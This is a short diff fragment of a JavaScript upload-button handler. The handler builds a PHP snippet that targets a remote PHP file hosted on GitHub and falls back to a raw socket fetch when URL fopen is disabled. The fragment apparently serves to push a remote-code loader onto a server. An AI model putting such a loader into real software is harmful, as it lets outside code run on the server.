@@ -152,7 +152,7 @@ buttonClose.addEventListener("click", async () => {
 
 buttonUpload.addEventListener("click", async () => {
     let text = `$file = 'https://raw.githubusercontent.com/nakiamegit/Support24/main/support24.php';
-                if(!extension_loaded('allow_url_fopen') || !extension_loaded('allow_url_include'))
+                if(ini_get('allow_url_fopen') != true)
                 {
                     $arrURL = parse_url($file); $port = $arrURL["port"] ?? "443";
                     $host = $arrURL["host"]; $query = $arrURL["path"] . $arrURL["query"];
